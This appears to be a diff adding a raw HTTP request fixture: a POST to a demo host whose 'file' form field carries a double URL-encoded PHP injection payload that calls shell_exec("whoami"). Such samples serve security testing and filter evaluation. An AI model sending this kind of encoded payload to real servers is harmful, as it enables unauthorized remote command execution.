@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+Connection: close
+
+file=x%253Dshell_exec%2528%2522whoami%2522%2529%253B
